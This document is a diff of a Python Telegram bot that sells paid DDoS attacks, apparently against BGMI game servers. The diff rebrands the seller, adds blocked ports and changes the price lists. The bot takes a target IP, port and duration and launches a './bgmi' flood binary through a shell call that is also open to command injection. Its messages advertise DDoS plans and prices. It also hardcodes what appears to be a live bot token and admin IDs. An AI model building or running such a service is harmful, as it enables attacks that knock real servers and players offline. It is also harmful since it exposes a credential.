@@ -1,21 +1,17 @@
-#script by @venomXcrazy
-
 import telebot
 import subprocess
 import datetime
 import os
 
-from keep_alive import keep_alive
-keep_alive()
 # insert your Telegram bot token here
 bot = telebot.TeleBot('7492939218:AAF1K2CLWNUyDyfhYKs3N2IGqkcFGJJKV4Q')
-
 # Admin user IDs
 admin_id = ["5512007480"]
 
+blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list
+
 # File to store allowed user IDs
 USER_FILE = "users.txt"
-
 # File to store command logs
 LOG_FILE = "log.txt"
 
@@ -48,7 +44,6 @@ allowed_user_ids = read_users()
 
 # Function to log command to the file
 def log_command(user_id, target, port, time):
-    admin_id = ["5588464519"]
     user_info = bot.get_chat(user_id)
     if user_info.username:
         username = "@" + user_info.username
@@ -63,12 +58,12 @@ def clear_logs():
     try:
         with open(LOG_FILE, "r+") as file:
             if file.read() == "":
-                response = "Logs are already cleared. No data found ❌."
+                response = "𝗧𝗵𝗲𝗿𝗲 𝗮𝗿𝗲 𝗡𝗼 𝗟𝗼𝗴𝘀 ."
             else:
                 file.truncate(0)
-                response = "Logs cleared successfully ✅"
+                response = "𝗔𝗹𝗹 𝗟𝗼𝗴𝘀 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 ✅"
     except FileNotFoundError:
-        response = "No logs found to clear."
+        response = "𝗛𝗲𝗿𝗲 𝗡𝗼 𝗔𝗡𝘆 𝗟𝗼𝗴𝘀."
     return response
 
 # Function to record command logs
@@ -153,7 +148,7 @@ def add_user(message):
         else:
             response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
     else:
-        response = "You have not purchased yet purchase now from:- @venomXcrazy."
+        response = "You have not purchased yet purchase now from:- @Fridayxd."
 
     bot.reply_to(message, response)
 
@@ -189,7 +184,7 @@ def remove_user(message):
             response = '''Please Specify A User ID to Remove. 
 ✅ Usage: /remove <userid>'''
     else:
-        response = "You have not purchased yet purchase now from:- @venomXcrazy 🙇."
+        response = "You have not purchased yet purchase now from:- @Fridayxd 🙇."
 
     bot.reply_to(message, response)
 
@@ -208,7 +203,7 @@ def clear_logs_command(message):
         except FileNotFoundError:
             response = "Logs are already cleared ❌."
     else:
-        response = "You have not purchased yet purchase now from :- @venomXcrazy ❄."
+        response = "You have not purchased yet purchase now from :- @Fridayxd ❄."
     bot.reply_to(message, response)
 
 
@@ -227,7 +222,7 @@ def clear_users_command(message):
         except FileNotFoundError:
             response = "users are already cleared ❌."
     else:
-        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @venomXcrazy 🙇."
+        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @Fridayxd 🙇."
     bot.reply_to(message, response)
  
 
@@ -252,7 +247,7 @@ def show_all_users(message):
         except FileNotFoundError:
             response = "No data found ❌"
     else:
-        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @venomXcrazy ❄."
+        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @Fridayxd ❄."
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['logs'])
@@ -270,16 +265,19 @@ def show_recent_logs(message):
             response = "No data found ❌"
             bot.reply_to(message, response)
     else:
-        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @venomXcrazy ❄."
+        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @Fridayxd ❄."
         bot.reply_to(message, response)
 
 
 # Function to handle the reply when free users run the /bgmi command
 def start_attack_reply(message, target, port, time):
+    if port in blocked_ports:
+            bot.send_message(message.chat.id, f"*𝗣𝗼𝗿𝘁 {port} 𝗶𝘀 𝗔 𝗕𝗹𝗼𝗰𝗸𝗲𝗱 𝗣𝗼𝗿𝘁 𝗣𝗹𝗲𝗮𝘀𝗲 𝗘𝗻𝘁𝗲𝗿 𝗡𝗲𝘄 𝗣𝗼𝗿𝘁 𝗡𝗼𝘁 𝗪𝗼𝗿𝗸𝗶𝗻𝗴 𝗣𝗼𝗿𝘁 𝗜𝘀 8700, 20000, 443, 17500, 9031, 20002, 20001*", parse_mode='Markdown')
+            return
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- User of @venomXcrazy"
+    response = f"{username}, 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝗿𝘁𝗲𝗱 ♥︎‿♥︎\n\n𝗧𝗮𝗿𝗴𝗲𝘁 𝗶𝗽: {target}\n𝗧𝗮𝗿𝗴𝗲𝘁 𝗣𝗼𝗿𝘁: {port}\n𝗧𝗶𝗺𝗶𝗻𝗴: {time} 𝘀𝗲𝗰"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -296,7 +294,7 @@ def handle_bgmi(message):
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
-                response = "You Are On Cooldown ❌. Please Wait 10sec Before Running The /bgmi Command Again."
+                response = "𝗬𝗼𝘂 𝗔𝗿𝗲 𝗜𝗻 𝗖𝗼𝗼𝗹 𝗗𝗼𝘄𝗻 𝗠𝗼𝗱𝗲. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 5 𝗺𝗶𝗻 𝗧𝗵𝗲𝗻 𝗦𝗲𝗻𝗱 𝗬𝗼𝘂𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱"
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -315,15 +313,14 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 110"
                 process = subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
+                response = f"𝗗𝗱𝗼𝘀 𝗮𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱. 𝗜𝗽: {target} \n𝗣𝗼𝗿𝘁: {port} \n𝗧𝗶𝗺𝗲: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
         else:
-            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
+            response = "✅ Usage :- Your_Command <target> <port> <time>"  # Updated command syntax
     else:
-        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @venomXcrazy")
+        response = " 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗡𝗼𝘁 𝗶𝗻 𝗔𝗽𝗽𝗿𝗼𝘃𝗲 𝗨𝘀𝗲𝗿𝘀 ."
 
     bot.reply_to(message, response)
-
 
 # Add /mylogs command to display logs recorded for bgmi and website commands
 @bot.message_handler(commands=['mylogs'])
@@ -347,18 +344,15 @@ def show_command_logs(message):
 
 @bot.message_handler(commands=['help'])
 def show_help(message):
-    help_text ='''🤖 Available commands:
-💥 /bgmi : Method For Bgmi Servers. 
-💥 /rules : Please Check Before Use !!.
-💥 /mylogs : To Check Your Recents Attacks.
-💥 /plan : Checkout Our Botnet Rates.
-💥 /myinfo : TO Check Your WHOLE INFO.
+    help_text ='''🤖 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗜𝗻 𝗢𝘂𝗿 𝗕𝗼𝘁𝘀:
+💢 Your_command : 𝗶𝘁'𝘀 𝘂𝘀𝗲 𝗙𝗼𝗿 𝗗𝗱𝗼𝘀. 
+💢 /rules : 𝗜𝘁'𝘀 𝘂𝘀𝗲 𝗳𝗼𝗿 𝗰𝗵𝗲𝗰𝗸 𝗿𝘂𝗹𝗲𝘀 !!.
+💢 /mylogs : 𝘂𝘀𝗲 𝗳𝗼𝗿 𝗰𝗵𝗲𝗰𝗸 𝘆𝗼𝘂𝗿 𝗿𝗲𝗰𝗲𝗻𝘁 𝗮𝗰𝘁𝗶𝗼𝗻𝘀.
+💢 /plan : 𝗰𝗵𝗲𝗰𝗸 𝗢𝘂𝗿 𝗣𝗿𝗶𝗰𝗲𝘀 𝗼𝗳 𝗗𝗱𝗼𝘀
 
-🤖 To See Admin Commands:
-💥 /admincmd : Shows All Admin Commands.
+🤖 𝗶𝗳 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗔𝗱𝗺𝗶𝗻 𝗧𝗵𝗲𝗻 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀:
+💢 /admincmd : 𝗢𝗻𝗹𝘆 𝗙𝗼𝗿 𝗔𝗱𝗺𝗶𝗻𝘀
 
-Buy From :- @venomXcrazy
-Official Channel :- https://t.me/V3NOM_CH3AT
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -375,49 +369,44 @@ def welcome_start(message):
     user_name = message.from_user.first_name
     response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss.
 🤖Try To Run This Command : /help 
-✅BUY :- @venomXcrazy'''
+✅BUY :- @Fridayxd'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
 def welcome_rules(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name} Please Follow These Rules ⚠️:
-
-1. Dont Run Too Many Attacks !! Cause A Ban From Bot
-2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
-3. MAKE SURE YOU JOINED https://t.me/venomcha7 OTHERWISE NOT WORK
-4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
+    response = f'''👋🏻𝗪𝗲𝗹𝗰𝗼𝗺𝗲 {user_name} 𝗧𝗼 𝗢𝘂𝗿 𝗗𝗱𝗼𝘀 𝗕𝗼𝘁.
+    𝗜𝘁'𝘀 𝗔 𝗗𝗱𝗼𝘀 𝗕𝗼𝘁 𝗪𝗵𝗶𝗰𝗵 𝘄𝗼𝗿𝗸𝘀 𝗢𝗻 𝗨𝗱𝗽 𝗦𝗲𝗿𝘃𝗲𝗿𝘀
+    𝗬𝗼𝘂 𝗡𝗲𝗲𝗱 𝗧𝗼 𝗕𝘂𝘆 𝗣𝗹𝗮𝗻 𝗙𝗼𝗿 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀
+    𝗜𝗳 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗙𝗿𝗶𝘀𝘁 𝗧𝗶𝗺𝗲 𝗧𝗵𝗲𝗻 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 /help
+    𝗗𝗺 𝗙𝗼𝗿 𝗠𝗼𝗿𝗲 𝗜𝗻𝗳𝗼 @fridayxd
+'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
 def welcome_plan(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
+    response = f'''{user_name}, 𝗬𝗼𝘂 𝗡𝗲𝗲𝗱 𝗧𝗼 𝗕𝘂𝘆 𝗢𝘂𝗿 𝗔𝗻𝘆 𝗢𝗻𝗲 𝗣𝗹𝗮𝗻𝘀 𝗙𝗼𝗿 𝗙𝘂𝗰𝗸 𝗦𝗲𝗿𝘃𝗲𝗿𝘀
 
-Vip 🌟 :
--> Attack Time : 300 (S)
-> After Attack Limit : 10 sec
--> Concurrents Attack : 5
-
-Pr-ice List💸 :
-Day-->80 Rs
-Week-->400 Rs
-Month-->1000 Rs
+𝗽𝗿𝗶𝗰𝗲 𝗟𝗶𝘀𝘁💸 :
+𝗗𝗮𝘆𝘀 :- 100
+𝗪𝗲𝗲𝗸-->400
+𝗠𝗼𝗻𝘁𝗵-->800
+𝗗𝗺 𝗛𝗲𝗿𝗲 : @FRIDAYXD
 '''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['admincmd'])
 def welcome_plan(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name}, Admin Commands Are Here!!:
+    response = f'''{user_name}, 𝗔𝗱𝗺𝗶𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀!!:
 
-💥 /add <userId> : Add a User.
-💥 /remove <userid> Remove a User.
-💥 /allusers : Authorised Users Lists.
-💥 /logs : All Users Logs.
-💥 /broadcast : Broadcast a Message.
-💥 /clearlogs : Clear The Logs File.
-💥 /clearusers : Clear The USERS File.
+💯 /add <userId> : 𝗔𝗱𝗱 𝗨𝘀𝗲𝗿𝘀.
+💢 /remove <userid> 𝗥𝗲𝗺𝗼𝘃𝗲 𝗨𝘀𝗲𝗿𝘀.
+💯 /allusers : 𝗔𝗹𝗹 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗨𝘀𝗲𝗿𝘀.
+💯 /logs : 𝗔𝗹𝗹 𝗨𝘀𝗲𝗿𝘀 𝗟𝗼𝗴𝘀.
+💢 /broadcast : 𝗦𝗲𝗻𝗱 𝗔𝗹𝗹 𝗠𝗮𝘀𝘀𝗮𝗴𝗲 𝗔𝘁 𝗢𝗻𝗰𝗲.
+💢 /clearlogs : 𝗖𝗹𝗲𝗮𝗿 𝗔𝗹𝗹 𝗟𝗼𝗴𝘀.
 '''
     bot.reply_to(message, response)
 
